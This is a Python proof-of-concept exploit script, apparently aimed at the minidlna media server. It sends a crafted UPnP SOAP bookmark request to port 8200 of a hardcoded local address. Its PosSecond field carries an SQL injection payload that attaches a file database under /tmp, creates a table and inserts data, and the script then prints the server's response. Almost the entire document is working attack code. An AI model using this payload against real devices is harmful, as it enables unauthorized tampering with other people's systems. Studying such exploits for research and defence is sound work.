#!/usr/bin/env python
"""
minidlnad sql injection 
"""
from socket import *
import sys
import urllib
import telnetlib



host='192.168.0.1'
port=8200



sock=socket(AF_INET,SOCK_STREAM)
sock.connect((host,port))
sock.settimeout(100)

b="""<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <s:Body>
    <u:Play xmlns:u="urn:schemas-upnp-org:service:AVTransport:1">
      <ObjectID>ob2</ObjectID>
      <PosSecond>2);attach database "/tmp/t2.db" as tt;create table tt.ff (foo INT);insert into tt.ff values (0);--</PosSecond>
    </u:Play>
  </s:Body>
</s:Envelope>
"""

s='POST / HTTP/1.1 \r\n' 
s+='Host: %s\r\n' % host
s+='User-Agent: Arduino \r\n'
s+='SOAPAction: "urn:schemas-upnp-org:service:AVTransport:1#X_SetBookmark"\r\n'
s+='Content-Type: text/xml; charset="utf-8"\r\n'
s+='Content-length: %d\r\n' % len(b)
s+='\r\n'
s+=b

sock.sendall(s)
print 'sent'
data=''
while 1:
    s=''
    try:
        s=sock.recv(11111)
    except:
        s=''
    if len(s)<1:
        break
    data+=s

print data
